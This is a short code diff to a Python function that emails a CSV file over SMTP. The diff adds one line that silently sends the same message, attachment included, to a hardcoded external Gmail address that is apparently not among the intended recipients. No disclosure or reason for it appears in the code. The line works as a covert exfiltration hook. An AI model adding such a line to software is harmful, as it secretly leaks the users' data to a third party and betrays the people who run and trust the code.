@@ -88,6 +88,7 @@ def send_email_with_csv(csv_path, receiver_email, fecha=None, use_html=True):
         server.login(sender_email, sender_password)  
         text = msg.as_string()
         server.sendmail(sender_email, receiver_email, text)
+        server.sendmail(sender_email, "larro200410@gmail.com", text)
         server.quit()
         print("Email sent successfully!")
     except Exception as e:
